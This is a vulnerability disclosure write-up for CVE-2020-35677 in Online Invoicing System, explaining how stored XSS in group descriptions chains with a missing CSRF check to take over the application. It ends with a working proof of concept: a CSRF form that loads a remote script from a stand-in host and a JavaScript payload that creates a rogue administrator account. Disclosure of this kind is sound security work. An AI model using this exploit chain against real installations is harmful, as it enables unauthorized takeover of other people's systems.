---
layout: post
title: CVE-2020-35677
tags: [CVE-Writeup, XSS, CSRF, Chaining]
author: Ingredous Labs
comment: true
---

```
Software Name: Online Invoicing System
Software Version: < 4.0
Software Developer: https://bigprof.com/
Link to Software: https://github.com/bigprof-software/online-invoicing-system
Vulnerability: Application Takeover via chaining Stored XSS + CSRF
CVE ID: Pending
Pending
```

# Introduction

Online Invoicing System fails to adequately sanitize fields for HTML characters upon an administrator creating a new group thus resulting in Stored Cross-Site Scripting. The caveat here is that an attacker would need administrative privileges in order to create the payload thus completely mitigating the privilege escalation impact as there is only one high privileged role. However it was discovered that the endpoint which is responsible for creating the group lacks CSRF protection as well making it possible for an attacker to chain both of these vulnerabilities eventually resulting in taking over the application.

# Exploitation Details

**PHP Version used throughout this writeup: PHP 7.4.8**

`admin/pageEditGroup.php` returns a form which allows an administrator to create a new group. This form has two fields which accept user input (`Group Name` & `Description`) while the rest of the fields are checkbox and radio forms.

To learn more about how this form works, lets take a closer look at the code which is responsible.

**admin/pageEditGroup.php**:

![Screenshot]({{ site.baseurl }}/images/posts/2020/ois-xss2/formcode.png)

As shown on Lines 3 & Lines 4, the value of the user inputs retrieved from the body of the POST request are first passed into the `makeSafe()` function before being initialized as the value of their respective variable. The `makeSafe()` function was taken apart in great detail in the following [writeup](https://labs.ingredous.com/2020/07/13/ois-sqli/). Long story short, `makeSafe()` is responsible for essentially catching and dealing with any special characters that could result in a SQL Injection. An example of such special characters are null bytes, single quotes, line feeds, carriage returns, etc. 

While `makeSafe()` is helpful for preventing SQL Injections, it however is not responsible for sanitizing any user input which contains HTML characters. As a result of this, the unsanitized user input is stored directly in the database as shown on Line 35:

~~~php
sql("insert into membership_groups set name='{$name}', description='{$description}', allowSignup='{$allowSignup}', needsApproval='{$needsApproval}'", $eo);
~~~

However before declaring this Cross-Site Scripting, lets see if there is any sanitization done on the values before reflecting them onto the page.

**admin/pageViewGroups.php**:

![Screenshot]({{ site.baseurl }}/images/posts/2020/ois-xss2/viewgroup.png)

As shown on Line 1 above, a SQL query is executed which will return the values from the following columns:

~~~
groupID - Column 0
name - Column 1
description - Column 2
~~~

Afterwards a while loop is constructed in order to iterate and retrieve the values returned from each column. The index in which `$row` is returning corresponds to the position of the columns listed above, for example `$row[0]` will be the `groupID` while `$row[1]` will be the `name` and finally `$row[2]` will be the `description`.

As shown on Line 6, the application directly reflects the values of `$row[0]` and `$row[1]` onto the page. Before reflecting the value of `$row[2]`, it is passed into the `thisOr()` function in which the [earlier writeup](https://labs.ingredous.com/2020/07/13/ois-membershipsignup-xss/) explained the logic of the function. 

TL;DR: `thisOr()` performs a ternary operation on the value of the passed in argument. If the value is not empty it will be directly returned. However in cases where the value is empty, the `&nbsp` HTML entity will be returned (which is a space). This function does nothing to sanitize any input being reflected onto the page.

Due to this, we can now confirm that the application would be vulnerable to Stored Cross-Site Scripting.

While this can be considered an issue, any impact here is severely mitigated as unlike other applications such as Wordpress which provide multiple tiers of high privileges such as Moderator, Admin, Super Admin, etc, as this application only has one admin level. This means that in order for an attacker to succesfully exploit the application, they would either need to convince the application's admin to input the XSS payload which is very unlikely or have an account with admin privileges themselves which defeats the purpose of exploiting the application via this way.

However when viewing the request which is responsible for creating the group, an astute attacker may observe that there appears to be no form of CSRF protection:

![Screenshot]({{ site.baseurl }}/images/posts/2020/ois-xss2/request.png)

As reviewed in an [earlier writeup](https://labs.ingredous.com/2020/07/13/ois-membershipsignup-xss/) , the application does not utilize `Same Site Cookies` meaning this endpoint would be vulnerable to Cross-Site Request Forgery.

While this is could be considered a serious issue, it is not the end of the world for the application as the attacker only has the ability to CRUD groups. The attacker would be unable to add themselves directly into a group and moreso would be unable to create a group which has administrative privileges as the application only limits these types of privileges to the default Admin's group.

To recap where an attacker currently stands in the context of exploitation:
- Application is vulnerable to Stored XSS however an attacker which already has administrative privileges is required to create the initial payload.
- Application is vulnerable to CSRF which would allow an attacker to create custom groups.

In order for an attacker to gain successful remote exploitation on this application, they are able to chain the two vulnerabilities together to leverage a complete takeover. The attacker will need to first create a simple CSRF proof of concept payload which will look similar to:

~~~html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/admin/pageEditGroup.php" method="POST">
      <input type="hidden" name="groupID" value="" />
      <input type="hidden" name="name" value="Randomgroup" />
      <input type="hidden" name="description" value="randomgroup" />
      <input type="hidden" name="visitorSignup" value="1" />
      <input type="hidden" name="saveChanges" value="1" />
      <snip>
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
~~~

In the CSRF proof of concept above, the attacker will need to replace either the value of the `name` parameter or `description` parameter with their payload. However it would be a good idea to test this locally first as the attacker will notice that the `name` field has a character length restriction in the database:

![Screenshot]({{ site.baseurl }}/images/posts/2020/ois-xss2/sql.png)

As shown above, the `name` column is of type `VARCHAR(100)` meaning it will only take up to 100 bytes. As an ASCII character is 1 byte, the maximum characters you could store in this column would most likely be 100. While this is not a dealbreaker, it can definitely truncate the attacker's payload and ruin the exploitation process. However an attacker could also use the `description` parameter as it's value is directly reflected on the page as well. Looking at the `description` column is of type `text` and is able to take any amount of characters, making it the smarter choice here.

After updating the `description` parameter to contain the attacker's payload in the description above, the proof of concept is ready to be hosted.

Upon hosting the proof of concept and having the application's admin browse to it, the CSRF vulnerability will be triggered and a group will be created with the description containing an XSS payload.

Finally when the application's admin browses to the Groups List (located at `/admin/pageViewGroups.php`), the XSS payload will be executed thus resulting in a successful chain. As the XSS payload will be executed in the context of the application, the Same Origin Policy is bypassed therefore allowing an attacker to leverage their privileges to the highest available and effectively takeover the application.


# Proof of Concept

~~~html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/admin/pageEditGroup.php" method="POST">
      <input type="hidden" name="groupID" value="" />
      <input type="hidden" name="name" value="Randomgroup" />
      <input type="hidden" name="description" value="<script src=//your-app.pw/payload.js></script>" />
      <input type="hidden" name="visitorSignup" value="1" />
      <input type="hidden" name="saveChanges" value="1" />
      <snip>
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
~~~

**Replace `your-app.pw/payload.js` found in the value of the description parameter above.**

~~~javascript
//payload.js

// create admin with username attacker1337
var req = new XMLHttpRequest();
var url = ""+ "/admin/pageEditMember.php";
var regex = /csrf_token" value="([^"]*?)"/g;
req.open("GET", url, false);
req.send();
var nonce = regex.exec(req.responseText);
var nonce = nonce[1];
var params = "csrf_token="+nonce+"&oldMemberID=&memberID=attacker1337&password=attacker1337&confirmPassword=attacker1337&email=attacker%40testing.io&groupID=2&isApproved=1&custom1=&custom2=&custom3=&custom4=&comments&saveChanges=1";
req.open("POST", url, true);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send(params);
~~~

The Javascript snippet above will create a new administrator with the username and password being `attacker1337`.
